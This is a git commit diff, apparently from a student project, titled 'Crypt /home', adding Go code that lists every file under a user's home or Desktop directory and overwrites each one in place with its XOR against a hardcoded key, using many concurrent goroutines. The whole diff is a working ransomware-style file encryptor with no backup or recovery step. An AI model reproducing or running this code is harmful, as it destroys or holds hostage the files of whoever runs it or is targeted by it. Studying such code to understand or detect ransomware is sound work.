981af4a0e5e5e37129b353110751c015dcaef607
TomFox <thomas.rogard@ynov.com>
2021-10-21 12:56:32 +0200

    Crypt /home

--- main/main.go
+++ main/main.go
@@ -1,44 +1,66 @@
 package main
 
 import (
+	"fmt"
 	"io/ioutil"
 	"os"
 	"os/exec"
+	"runtime"
 	"strings"
 	"sync"
 )
 
 var wg sync.WaitGroup
+var wgc sync.WaitGroup
 
 var Xorstring = "salut_je_suis_la_phrase_qui_xor_cette_save_je_suis_tres_long_cest_normal_salut_les_mentor_je_suis_un_xor"
 
-func Crypt(filename string) {
+func Crypt(filename string, ch chan string) {
 	file, _ := os.Open(filename)
 	temp, _ := file.Stat()
 	if temp == nil {
-		wg.Done()
-		return
+		wgc.Done()
+		fmt.Println("fail " + filename)
+		Crypt(<-ch, ch)
 	}
 	arr := make([]byte, temp.Size())
-	_, err := file.Read(arr)
-	if err != nil {
-		return
-	}
+	_, _ = file.Read(arr)
+	file = nil
 	var xor []byte
 	for i := 0; i < len(arr); i++ {
 		xor = append(xor, arr[i]^Xorstring[i%len(Xorstring)])
 	}
+	arr = nil
 	_ = ioutil.WriteFile(filename, xor, 0644)
-	wg.Done()
+	xor = nil
+	wgc.Done()
+	fmt.Println(filename)
+	Crypt(<-ch, ch)
 }
 
 func main() {
-	cmd := exec.Command("bash", "-c", "find /home/$USER/ -type f")
+	cmd := exec.Command("bash", "-c", "find /home/tomfox/Desktop -type f")
 	output, _ := cmd.CombinedOutput()
 	listfile := strings.Split(string(output), "\n")
+	ch := make(chan string, len(listfile))
 	for _, file := range listfile {
 		wg.Add(1)
-		go Crypt(file)
+		wgc.Add(1)
+		go func(file string) {
+			ch <- file
+			wg.Done()
+		}(file)
 	}
 	wg.Wait()
+	for i := 0; i < 200; i++ {
+		if len(ch) == 0 {
+			break
+		}
+		go Crypt(<-ch, ch)
+	}
+	wgc.Wait()
+	fmt.Println("Ici")
+	fmt.Println(len(listfile))
+	fmt.Println(len(ch))
+	runtime.GC()
 }
